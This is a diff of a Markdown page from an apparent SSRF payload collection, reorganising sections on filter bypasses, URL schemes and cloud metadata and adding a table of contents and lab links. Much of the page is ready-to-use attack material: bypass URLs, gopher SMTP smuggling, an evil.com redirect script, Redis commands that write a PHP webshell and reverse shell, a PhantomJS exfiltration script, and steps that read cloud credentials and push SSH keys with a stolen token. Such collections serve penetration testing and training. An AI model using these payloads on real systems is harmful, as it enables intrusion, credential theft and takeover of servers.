@@ -1,13 +1,65 @@
 +++
 title = "Server-Side Request Forgery"
-date = '2022-10-16'
+date = '2023-04-01'
 description = 'All about Server-Side Request Forgery techniques, methods, payloads, how/why/when they work.'
 includ_toc = 'true'
 +++
+
 # Server-Side Request Forgery
 
 > Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.
+## Summary
 
+* [Tools](#tools)
+* [Payloads with localhost](#payloads-with-localhost)
+* [Bypassing filters](#bypassing-filters)
+  * [Bypass using HTTPS](#bypass-using-https)
+  * [Bypass localhost with [::]](#bypass-localhost-with-)
+  * [Bypass localhost with a domain redirection](#bypass-localhost-with-a-domain-redirection)
+  * [Bypass localhost with CIDR](#bypass-localhost-with-cidr)
+  * [Bypass using a decimal IP location](#bypass-using-a-decimal-ip-location)
+  * [Bypass using octal IP](#bypass-using-octal-ip)
+  * [Bypass using IPv6/IPv4 Address Embedding](#bypass-using-ipv6ipv4-address-embedding)
+  * [Bypass using malformed urls](#bypass-using-malformed-urls)
+  * [Bypass using rare address](#bypass-using-rare-address)
+  * [Bypass using URL encoding](#bypass-using-url-encoding)
+  * [Bypass using bash variables](#bypass-using-bash-variables)
+  * [Bypass using tricks combination](#bypass-using-tricks-combination)
+  * [Bypass using enclosed alphanumerics](#bypass-using-enclosed-alphanumerics)
+  * [Bypass filter_var() php function](#bypass-filter_var-php-function)
+  * [Bypass against a weak parser](#bypass-against-a-weak-parser)
+  * [Bypassing using jar protocol (java only)](#bypassing-using-jar-protocol-java-only)
+* [SSRF exploitation via URL Scheme](#ssrf-exploitation-via-url-scheme)
+  * [file://](#file)
+  * [http://](#http)
+  * [dict://](#dict)
+  * [sftp://](#sftp)
+  * [tftp://](#tftp)
+  * [ldap://](#ldap)
+  * [gopher://](#gopher)
+  * [netdoc://](#netdoc)
+* [SSRF exploiting WSGI](#ssrf-exploiting-wsgi)
+* [SSRF exploiting Redis](#ssrf-exploiting-redis)
+* [SSRF exploiting PDF file](#ssrf-exploiting-pdf-file)
+* [Blind SSRF](#blind-ssrf)
+* [SSRF to XSS](#ssrf-to-xss)
+* [SSRF from XSS](#ssrf-from-xss)
+* [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
+  * [SSRF URL for AWS Bucket](#ssrf-url-for-aws-bucket)
+  * [SSRF URL for AWS ECS](#ssrf-url-for-aws-ecs)
+  * [SSRF URL for AWS Elastic Beanstalk](#ssrf-url-for-aws-elastic-beanstalk)
+  * [SSRF URL for AWS Lambda](#ssrf-url-for-aws-lambda)
+  * [SSRF URL for Google Cloud](#ssrf-url-for-google-cloud)
+  * [SSRF URL for Digital Ocean](#ssrf-url-for-digital-ocean)
+  * [SSRF URL for Packetcloud](#ssrf-url-for-packetcloud)
+  * [SSRF URL for Azure](#ssrf-url-for-azure)
+  * [SSRF URL for OpenStack/RackSpace](#ssrf-url-for-openstackrackspace)
+  * [SSRF URL for HP Helion](#ssrf-url-for-hp-helion)
+  * [SSRF URL for Oracle Cloud](#ssrf-url-for-oracle-cloud)
+  * [SSRF URL for Kubernetes ETCD](#ssrf-url-for-kubernetes-etcd)
+  * [SSRF URL for Alibaba](#ssrf-url-for-alibaba)
+  * [SSRF URL for Docker](#ssrf-url-for-docker)
+  * [SSRF URL for Rancher](#ssrf-url-for-rancher)
 
 ## Tools
 
@@ -18,24 +70,24 @@ includ_toc = 'true'
 
 ## Payloads with localhost
 
-Basic SSRF v1
-
-```powershell
-http://127.0.0.1:80
-http://127.0.0.1:443
-http://127.0.0.1:22
-http://0.0.0.0:80
-http://0.0.0.0:443
-http://0.0.0.0:22
-```
-
-Basic SSRF - Alternative version
-
-```powershell
-http://localhost:80
-http://localhost:443
-http://localhost:22
-```
+* Using `localhost`
+  ```powershell
+  http://localhost:80
+  http://localhost:443
+  http://localhost:22
+  ```
+* Using `127.0.0.1`
+  ```powershell
+  http://127.0.0.1:80
+  http://127.0.0.1:443
+  http://127.0.0.1:22
+  ```
+* Using `0.0.0.0`
+  ```powershell
+  http://0.0.0.0:80
+  http://0.0.0.0:443
+  http://0.0.0.0:22
+  ```
 
 ## Bypassing filters
 
@@ -64,13 +116,11 @@ http://0000::1:3128/ Squid
 
 ### Bypass localhost with a domain redirection
 
-```powershell
-http://spoofed.burpcollaborator.net
-http://localtest.me
-http://customer1.app.localhost.my.company.127.0.0.1.nip.io
-http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
-http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
-```
+
+* `spoofed.[BURP_COLLABORATOR]` such as `spoofed.redacted.oastify.com`
+* `localtest.me` redirect to `::1`
+* `company.127.0.0.1.nip.io` redirect to `127.0.0.1`
+* `bugbounty.dod.network` redirect to `127.0.0.2`
 
 The service nip.io is awesome for that, it will convert any ip address as a dns.
 
@@ -78,9 +128,9 @@ The service nip.io is awesome for that, it will convert any ip address as a dns.
 NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
 ```
 
-### Bypass localhost with CIDR 
+### Bypass localhost with CIDR
 
-It's a /8
+IP addresses from 127.0.0.0/8
 
 ```powershell
 http://127.127.127.127
@@ -109,7 +159,7 @@ http://q177.0.0.1/ = http://127.0.0.1
 ...
 ```
 
-Ref: 
+Ref:
 - [DEFCON 29-KellyKaoudis SickCodes-Rotten code, aging standards & pwning IPv4 parsing](https://www.youtube.com/watch?v=_o1RPJAe4kU)
 - [AppSecEU15-Server_side_browsing_considered_harmful.pdf](https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
 
@@ -148,7 +198,7 @@ http://127.0.0.1/%61dmin
 http://127.0.0.1/%2561dmin
 ```
 
-### Bypass using bash variables 
+### Bypass using bash variables
 
 (curl only)
 
@@ -166,43 +216,10 @@ requests + browsers : 2.2.2.2
 urllib : 3.3.3.3
 ```
 
-### Bypass using enclosed alphanumerics 
+### Bypass using enclosed alphanumerics
 
 [@EdOverflow](https://twitter.com/EdOverflow)
 
-```powershell
-http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
-
-List:
-① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
-```
-
-### Bypass using unicode
-
-In some languages (.NET, Python 3) regex supports unicode by default.
-`\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.
-
-
-### Bypass filter_var() php function
-
-```powershell
-0://evil.com:80;http://google.com:80/ 
-```
-
-### Bypass against a weak parser
-
-by Orange Tsai ([Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf))
-
-```powershell
-http://127.1.1.1:80\@127.2.2.2:80/
-http://127.1.1.1:80\@@127.2.2.2:80/
-http://127.1.1.1:80:\@@127.2.2.2:80/
-http://127.1.1.1:80#\@127.2.2.2:80/
-```
-
-![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)
-
-### Bypassing using a redirect
 [using a redirect](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)
 
 ```powershell
@@ -233,7 +250,7 @@ make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
 Blind SSRF
 
 ```powershell
-jar:scheme://domain/path!/ 
+jar:scheme://domain/path!/
 jar:http://127.0.0.1!/
 jar:https://127.0.0.1!/
 jar:ftp://127.0.0.1!/
@@ -241,7 +258,7 @@ jar:ftp://127.0.0.1!/
 
 ## SSRF exploitation via URL Scheme
 
-### File 
+### File
 
 Allows an attacker to fetch the content of a file on the server
 
@@ -275,7 +292,7 @@ dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
 ssrf.php?url=dict://attacker:11111/
 ```
 
-### SFTP 
+### SFTP
 
 A network protocol used for secure file transfer over secure shell
 
@@ -303,7 +320,6 @@ ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
 
 ```powershell
 ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
-
 will make a request like
 HELO localhost
 MAIL FROM:<hacker@site.com>
@@ -313,10 +329,7 @@ From: [Hacker] <hacker@site.com>
 To: <victime@site.com>
 Date: Tue, 15 Sep 2017 17:20:26 -0400
 Subject: Ah Ah AH
-
 You didn't say the magic word !
-
-
 .
 QUIT
 ```
@@ -335,7 +348,6 @@ Content of evil.com/redirect.php:
 <?php
 header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
 ?>
-
 Now query it.
 https://example.com/?q=http://evil.com/redirect.php.
 ```
@@ -354,9 +366,7 @@ Content of evil.com/redirect.php:
                 'Corben was here, woot woot!',
                 '.'
         );
-
         $payload = implode('%0A', $commands);
-
         header('Location: gopher://0:25/_'.$payload);
 ?>
 ```
@@ -367,7 +377,7 @@ Wrapper for Java when your payloads struggle with "\n" and "\r" characters.
 
 ```powershell
 ssrf.php?url=netdoc:///etc/passwd
-``` 
+```
 
 ## SSRF exploiting WSGI
 
@@ -389,19 +399,17 @@ gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
 | key data              | (m bytes) |    | UWSGI_FILE |   |
 | value length          | (2 bytes) | 12 | (%0C%00)   |   |
 | value data            | (n bytes) |    | /tmp/test.py   |   |
-	
+
 
 ## SSRF exploiting Redis
 
 > Redis is a database system that stores everything in RAM
-
 ```powershell
 # Getting a webshell
 url=dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
 url=dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20file.php
 url=dict://127.0.0.1:6379/SET%20mykey%20"<\x3Fphp system($_GET[0])\x3F>"
 url=dict://127.0.0.1:6379/SAVE
-
 # Getting a PHP reverse shell
 gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
 gopher://127.0.0.1:6379/_config%20set%20dbfilename%20reverse.php
@@ -419,7 +427,7 @@ Example with [WeasyPrint by @nahamsec](https://www.youtube.com/watch?v=t5fB6OZsR
 <link rel=attachment href="file:///root/secret.txt">
 ```
 
-Example with PhantomJS 
+Example with PhantomJS
 
 ```js
 <script>
@@ -430,11 +438,9 @@ Example with PhantomJS
     exfil.onerror = function(){document.write('failed!')}
 </script>
 ```
-
 ## Blind SSRF
 
-> When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. 
-
+> When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read.
 Use an SSRF chain to gain an Out-of-Band output.
 
 From https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ / https://github.com/assetnote/blind-ssrf-chains
@@ -465,14 +471,13 @@ From https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ / https://github.co
 - [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)
 
 
-## SSRF to XSS 
+## SSRF to XSS
 
 by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
 
 ```bash
 http://brutelogic.com.br/poc.svg -> simple alert
 https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri= -> simple ssrf
-
 https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
 ```
 
@@ -488,7 +493,7 @@ The content of the file will be integrated inside the PDF as an image or text.
 
 ### Using an attachment
 
-Example of a PDF attachment using HTML 
+Example of a PDF attachment using HTML
 
 1. use `<link rel=attachment href="URL">` as Bio text
 2. use 'Download Data' feature to get PDF
@@ -660,23 +665,22 @@ http://metadata.google.internal/computeMetadata/v1beta1/instance/service-account
 Check the scope of the token
 
 ```powershell
-$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  
-
-{ 
-        "issued_to": "101302079XXXXX", 
-        "audience": "10130207XXXXX", 
-        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
-        "expires_in": 2443, 
-        "access_type": "offline" 
+$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA
+{
+        "issued_to": "101302079XXXXX",
+        "audience": "10130207XXXXX",
+        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
+        "expires_in": 2443,
+        "access_type": "offline"
 }
 ```
 
 Now push the SSH key.
 
 ```powershell
-curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
--H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
--H "Content-Type: application/json" 
+curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
+-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
+-H "Content-Type: application/json"
 --data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
 ```
 
@@ -687,13 +691,12 @@ Documentation available at `https://developers.digitalocean.com/documentation/me
 ```powershell
 curl http://169.254.169.254/metadata/v1/id
 http://169.254.169.254/metadata/v1.json
-http://169.254.169.254/metadata/v1/ 
+http://169.254.169.254/metadata/v1/
 http://169.254.169.254/metadata/v1/id
 http://169.254.169.254/metadata/v1/user-data
 http://169.254.169.254/metadata/v1/hostname
 http://169.254.169.254/metadata/v1/region
 http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
-
 All in one request:
 curl http://169.254.169.254/metadata/v1.json | jq
 ```
@@ -730,7 +733,7 @@ http://169.254.169.254/openstack
 (header required? unknown)
 
 ```powershell
-http://169.254.169.254/2009-04-04/meta-data/ 
+http://169.254.169.254/2009-04-04/meta-data/
 ```
 
 ### SSRF URL for Oracle Cloud
@@ -763,7 +766,6 @@ curl http://127.0.0.1:2379/v2/keys/?recursive=true
 
 ```powershell
 http://127.0.0.1:2375/v1.24/containers/json
-
 Simple example
 docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
 bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
@@ -782,6 +784,14 @@ curl http://rancher-metadata/<version>/<path>
 ```
 
 More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/
+
+## Labs
+
+* [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
+* [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
+* [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
+* [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
+* [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
 
 
 ## References
@@ -810,7 +820,7 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [Hacker101 SSRF](https://www.youtube.com/watch?v=66ni2BTIjS8)
 - [SSRF脆弱性を利用したGCE/GKEインスタンスへの攻撃例](https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/)
 - [SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1 - SaN ThosH - 10 Jan 2019](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)
-- [SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst](https://www.silentrobots.com/blog/2019/02/06/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
+- [SSRF Protocol Smuggling in Plaintext Credential Handlers : LDAP - @0xrst](https://www.silentrobots.com/ssrf-protocol-smuggling-in-plaintext-credential-handlers-ldap/)
 - [X-CTF Finals 2016 - John Slick (Web 25) - YEO QUAN YANG @quanyang](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/)
 - [Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure](https://www.notsosecure.com/exploiting-ssrf-in-aws-elastic-beanstalk/)
 - [PortSwigger - Web Security Academy Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)
